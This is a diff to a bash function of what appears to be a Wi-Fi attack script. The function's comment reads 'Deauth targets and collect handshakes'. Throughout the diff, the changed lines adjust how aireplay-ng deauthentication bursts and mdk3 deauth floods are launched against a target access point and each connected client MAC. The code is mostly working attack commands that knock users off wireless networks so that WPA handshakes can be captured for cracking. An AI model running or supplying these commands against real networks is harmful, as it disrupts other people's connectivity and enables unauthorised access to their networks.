@@ -597,15 +597,15 @@ fautocap()																#Deauth targets and collect handshakes
 								do
 									MACNUM=$((MACNUM + 1))
 									echo
-									sleep 1.8 && killall aireplay-ng 2> /dev/null&
-									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep sdvds
+									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep sdvds&
+									sleep 1.8
 									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
 									sleep 1
 								done
 							sleep 3
 						else
 							echo $BSSID > $HOME/BSSIDB
-							gnome-terminal -t "MDK3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
+							gnome-terminal -t "mdk3 on $NIC" --geometry=60x20+720+320 -x mdk3 $MON1 d -b $HOME/BSSIDB&
 							sleep 3 && killall mdk3 2> /dev/null&
 							sleep 6
 					fi
@@ -621,8 +621,8 @@ fautocap()																#Deauth targets and collect handshakes
 										do
 											MACNUM=$((MACNUM + 1))
 											echo
-											sleep 2.8 && killall aireplay-ng 2> /dev/null&
-											aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb
+											aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
+											sleep 2.8
 											echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
 											sleep 1
 										done
@@ -630,8 +630,8 @@ fautocap()																#Deauth targets and collect handshakes
 								else
 									echo $BSSID > $HOME/BSSIDB
 									gnome-terminal -t "MDK3 on $NIC2" --geometry=60x20+720+320 -x mdk3 $MON2 d -b $HOME/BSSIDB&
-									sleep 3 && killall mdk3 2> /dev/null&
-									sleep 6
+									sleep 5 && killall mdk3 2> /dev/null&
+									sleep 8
 							fi
 						else
 							if [ $CHKBASE -z ] 2> /dev/null
@@ -647,8 +647,8 @@ fautocap()																#Deauth targets and collect handshakes
 								do
 									MACNUM=$((MACNUM + 1))
 									echo
-									sleep 1.8 && killall aireplay-ng 2> /dev/null&
-									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb
+									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
+									sleep 1.8
 									echo $RED" [*] $GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
 									sleep 1
 								done
